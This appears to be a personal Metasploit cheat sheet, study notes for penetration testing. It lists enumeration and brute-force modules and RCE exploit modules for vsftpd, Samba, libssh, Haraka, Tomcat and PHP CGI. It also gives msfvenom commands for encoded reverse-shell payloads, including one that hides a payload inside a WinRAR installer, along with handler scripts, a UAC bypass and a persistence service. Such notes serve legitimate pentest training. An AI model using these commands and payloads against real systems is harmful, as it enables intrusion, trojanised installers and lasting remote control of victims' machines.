- Common exploits 
```
SMTP Haraka <2.8.9
ProFTPD 
badblue 2.72b
HFS Rejetto 2.3
```
****


> startup, db initialization and checks :-

```bash
sudo systemctl enable postgresql
sudo systemctl start posgresql

sudo msfdb init

IN MSF 
check if db is working
db_status
```

>msfconsole 

## Using "search"
```bash
search -h

# search for CVE's in 2017 for NOT windows
search cve:2022 type:exploit platform:-windows
```

## payloads & arch's
```bash
# 32bit payloads for windows are usually not indicated in the naming, so windows/meterpreter/reverse_tcp means 32bit windows/x64/meterpreter/reverse_tcp means a 64bit

- always remember to check the target architecture, use a payload that suites the archi

- options are a Meterpreter OR a DOS shell

# set a payload
set payload windows/meterpreter
```

## weird ones

>CONNECT

```bash
# connect allows you communicate with hosts, similar to nc interaction.
connect -h

connect 10.10.10.10 8080
```

### Creating and managing workspaces
```bash
# remember postgres has to be runing
> db_status
# the result of runing the command has to be 
# [*] Connected to msf. Connection type: postgresql.

> workspace -h

to view all the hosts 
> hosts

# create a new workspace named "PWN02"
workspace -a pwn02

# switch back to workspace named "default"
> workspace default
```

## Scanning & Enumeration
```bash
# do an nmap scan and save to an XML file, then start the postgresql server

Import nmap scan results
> db_import /path/to/xmlfile
> hosts
> services
> vulns

# Use nmap without a need to import scans by running inside a workspace in MSF 
> db_nmap -sV $IP -Pn -p- -vv -O
```

## Using Auxiliary Modules
```bash
# PORTSCAN
> search portscan
> use auxiliary/scanner/portscan/tcp

> search udp_sweep
> use auxiliary/scanner/discovery/udp_sweep
```

## FTP Enumeration
```bash
# enumerate ftp
> search type:auxiliary name:ftp
> use auxiliary/scanner/ftp/ftp_version
> use auxiliary/scanner/ftp/ftp_login
> use auxiliary/scanner/ftp/anonymous
```

## SMB Enumeration
```bash
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_version
> use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
> use auxiliary/scanner/smb/smb_login
> set SMBUser, PASS_FILE

smbclient -L \\\\$IP\ -U admin
smbclient \\\\$IP\\$SHARE
```

## Apache Enumeration
```bash
> search type:auxiliary name:http
> use auxiliary/scanner/http/http_version
> use auxiliary/scanner/http/http_header
> use auxiliary/scanner/http/robots.txt
> use auxiliary/scanner/http/dir_scanner
> auxiliary/scanner/http/files_dir
> use auxiliary/scanner/http/http_login
set AUTH_URI
# find legitimate users on an apache server
> use auxiliary/scanner/http/apache_userdir_enum
```

## MySQL enumeration
```bash
search type:auxiliary name:mysql
mysql_version
mysql_login
mysql_file_enum
mysql_writable_dirs
mysql_hashdump

# CREDENTIALED ENUMERATION
# do a crap tonne of enumeration with creds  
auxiliary/admin/mysql/mysql_enum
# Run mysql queries
auxiliary/admin/mysql/mysql_sql
# grap all schema info
auxiliary/scanner/mysql/mysql_schemadump


IF you started enumerating in a workspace, you can type the following commands to show information gathered so far
> hosts
> services
> loot
> creds
```
NB : always try to bruteforce `root` user creds with mysql_login
- `auxiliary/admin/mysql/mysql_enum` gives A LOT of info(users, hashes, mysql version and configs, privs) pertinent to mysql - use it to grab info once you get root creds

## SSH enumeration
```bash
ssh_login
ssh_enumusers
```

## SMTP enumeration
25, 465, 587
```bash
NB : Dont forget to set the correct port 

search type:auxiliary name:smtp
smtp_version

# username enumeration, use to generate a wordlist and bruteforce all services.
smtp_enum
```

## Vuln scanning
using auxiliary modules to detect vulnerabilities and using the exploits to take advantage of those detected vulnerabilties

```bash
# check all the services+versionnumber in searchsploit and search command in msf 
searchsploit "Microsoft Windows SMB"

# USING DB_AUTOPWN
# attempts to exploit or provide a list of msf exploits for services on various ports on targets whose information is stored in the db
> load db_autopwn
> db_autopwn -p -t -PI 22

# ANALYZE
# a cmd in msf that provides a list of exploits that are ready and match services+versions running on a target.
> analyze
```

## Web Apps 
Vuln scanning with  WMAP
WMAP is a web app vuln scanner used to automoate web server enum and scan web apps for vulners
```bash
# it uses all the auxiliary module scripts to do the vuln scanj
load wmap

# 6 commands comes with this module
# wmap_sites can be used to add a site to scan
# add a site to scan, you can add multiple sites
wmap_sites -a $IP

# wmap_targets can be used to define a target to do a scan on
wmap_targets -t http://$IP/
# list targets set to scan
wmap_targets -l
# list aux modules that would be relevant for the scan on hosts you added
wmap_run -t 
# Run all enabled modules
wmap run -e

# list all the vulners found 
wmap_vuln -l
```


## PUT Method check
```bash
use auxiliary/scanner/http/http_put
# set PATH to a dir that allows PUT
# you can set FILEDATA to be content e.g PHPshell oneliner
```

## Client Side Attacks
a client side attack vector involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed
```bash
# Generating msfvenom payloads
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > /tmp/32bitload.exe

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf -o /tmp/reverse32

MULTI HANDLER
use multi/handler
set payload to $APPRORIATE_SHELLCODE
set LHOST


ENCODING PAYLOADS
nb : shikata_ga_nai works on both linux & windows

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f exe 

# increasing encoder iteration, say 10
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -i 10 -e x86/shikata_ga_nai -f exe 

INJECTING PAYLOADS
- download a pe32 file that allows injection, like WINRAR setup file, the -k option preserves the behavior of the exe so it does its function even after sending shell.

msfvenom -p windows/meterpreter/reverse_tcp LHOS LPORT -e x86/shikata_ga_nai -f exe -x ./winrar32.exe -o embed.exe

AUTO PROCESS MIGRATE (post exp module)
run post/windows/manage/migrate
```

## Automating with Resource scripts
resource scripts are similar to batch scripts, they allow you automate repetitive tasks and commands, you can then load them(EXTENTION IS `.rc`)...
```bash
# default resource scripts that come pre packaged
ls -la /usr/share/metasploit-framework/scripts/resource
```
- say we want to setup a resource script that automatically starts a handler for receiving shells (it must be in sequential order as you would when typing manually)
```ruby
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $IP
set LPORT $PORT
run
```
 - To use the script you can be like :-
```bash
msfconsole -r handler.rc

#You can also run the resource script from inside msf
resource /path/to/script/rc

# you can generate a resource script from inside msf with makerc which would collate previous commands and make it into a rc script 
makerc /path/to/save/script/rc
```
- Resource script for tcp portscanner
```ruby
use auxiliary/scanner/portscan/tcp
set RHOSTS $IP
run
```


## Exploitation (common exploits/vulns)
> HFS

 >MS17-010 SMB - Eternal Blue

> WINRM

```bash
search type:auxiliary winrm

# check for supported auth mehods
use winrm_auth_methods
use 

# bruteforce winrm
use winrm_login


# ineract
use winrm_cmd

# get a meterpreter session (set FORCE_VBS true)
use winrm_script_exec 

```

>Apache Tomcat (v8.5.19 any <v9 RCE) runs on 8080, hosts apps developed in java

```bash
# for windows
search type:exploit tomcat_jsp
use tomcat_jsp_upload
set payload java/jsp_shell_bind_tcp
set SHELL cmd
# might require you to run it multiple times.
# you would need to use msfvenom to upgrade the shell to meterpeter
```

>FTP server (vsftpd v2.3.4 RCE)

```bash
search vsftpd
use vsftpd_234_backdoor

# can use shell_to_meterpreter to upgrade
```

>SAMBA v3.5.0 RCE allowing you upload an .so to a writable share, cause the server to load and execute it. (arbitrary shared library load) (versions 3.5.0 to 4.4.14, 4.5.10 and 4.6.4)

```bash
use is_known_pipename
check
run
# use shell to meterpreter to ugrade

# SAMBA version 3.0.20 < 3.0.25
use usermap_script
```

> SSH server (libssh v0.6.0-0.8.0) vulnerability to authentication bypass in libssh server code which we can leverage to execute commands

```bash
use libssh_auth_bypass
set SPAWN_PTY true
run
sessions -i $ID

# USE shell_to_meterpreter to upgrade to meterpreter
```

 >SMTP (Haraka <v2.8.9 cmd injection)
```bash
search type:exploit name:haraka
set email_to $CORRECT_MAIL
# set SRVPORT 9098
# set payload linux/x64/meterpreter_reverse_http
```

> PHP version <5.3.12/5.1.2 CGI argument Command injection
```bash 
seaarchsploit php cgi
18836.py

use exploit/multi/http/php_cgi_arg_injection
```
## Meterpreter + Post exp stuff
```bash
# execute a command on a meterpreter session without interacting with it 
sessions -C sysinfo -i 1

# edit a file in a meterpreter shell
edit flag.txt
download flag.txt

# get md5sum of a file
checksum md5 /path/file

# searching 
search -d /usr/bin -f *backdoor*
search -f *.php

# postexploitation
#list drives
show_mount
```

## Post exp modules
```
# searching for post exp modules to run
search upgrade platform:windows
search migrate platform:windows
search enum_applications
search enum_patches
search enum_shares
```

### Bypassing UAC
```bash
# useful when you are in localadmin group but you arent system
search bypassuac
use bypassuac_injection
set payload $APPROPRIATE_BIT_PAYLOAD_ARCH
set target $APPROPRIATE_BIT_ARCHITECTURE

# after using the bypass, getsystem
getsystem
```

#### Windows  Persistence 
```bash
search platform:windows persistence
use persistence_service
# it uses only 32bit staged payloads so use windows/meterpreter/reverse_tcp  - Whenever you setup a multi/handler to the same payload, lhost and lport you will receive a shell from the target

# Enabling RDP
use post/windows/manage/enable_rdp
```

#### Pivoting 
```bash 

```
